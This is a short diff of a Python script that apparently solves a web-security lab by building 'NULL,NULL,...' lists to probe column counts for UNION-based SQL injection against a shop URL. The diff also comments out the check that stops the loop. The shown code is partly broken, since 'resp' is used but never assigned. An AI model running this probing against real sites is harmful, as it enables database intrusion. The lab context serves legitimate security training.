@@ -20,7 +20,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
 def main(args):
-    shop = Shop(args.url, args.no_proxy, )
+    shop = Shop(args.url, args.no_proxy)
     nulls_list = ["NULL"]
     for i in range(2,51):
         nulls = ",".join(nulls_list)
@@ -28,8 +28,8 @@ def main(args):
         exploit_url = shop.base_url + filter_path
         print(exploit_url)
         #resp = requests.get(shop.base_url + filter_path)
-        if resp.status_code == 200:
-            break
+       #if resp.status_code == 200:
+       #    break
         nulls_list.append("NULL")        
     shop.is_solved()
     
